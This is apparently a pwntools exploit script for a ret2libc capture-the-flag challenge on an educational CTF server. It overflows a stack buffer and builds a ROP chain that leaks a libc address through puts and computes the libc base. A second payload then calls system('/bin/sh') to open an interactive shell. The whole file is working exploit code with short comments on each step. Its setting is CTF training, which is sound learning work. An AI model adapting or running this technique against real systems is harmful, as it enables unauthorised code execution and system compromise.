#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
binary = remote('edu-ctf.csie.org', 10175)
library = ELF('./libc.so')

pop_rdi = 0x400733
pop_rsi_r15 = 0x400731
ret = 0x400506
# objdump -R ./ret2libc
# libc_start_main is called before main, thus it's definitely been resolved
# a good info leak target
libc_start_main = 0x600ff0

gets_plt = 0x400530
puts_plt = 0x400520
writable_mem = 0x601080

main = 0x400698
payload = flat(
        b'a' * (0x30 + 8),
        pop_rdi,
        libc_start_main,
        puts_plt,
        main
    )

binary.sendlineafter(":D", payload)
# receive the memory address
binary.recvline()

# unpack the address, padded with 2 null bytes to make up a total of 8 bytes
libc = u64(binary.recv(6) + b'\0\0')
# readelf -s libc-2.27.so
offset = 0x21ab0
system_offset = 0x4f440

libc_base = libc - offset
#shortcut
'''
library.address = libc_base
payload = flat(
    ...,
    bin_sh_offset,
    library.sym.system
)
'''

success("libc -> %s" % hex(libc_base))

system_addr = libc_base + system_offset
bin_sh_offset = next(library.search(b'/bin/sh'))
bin_sh = libc_base + bin_sh_offset
# extra return so that the stack is 16-bytes aligned
payload = flat(
        b'a' * 0x38,
        ret,
        pop_rdi,
        bin_sh,
        system_addr
    )

binary.sendlineafter(":D", payload)
binary.interactive()
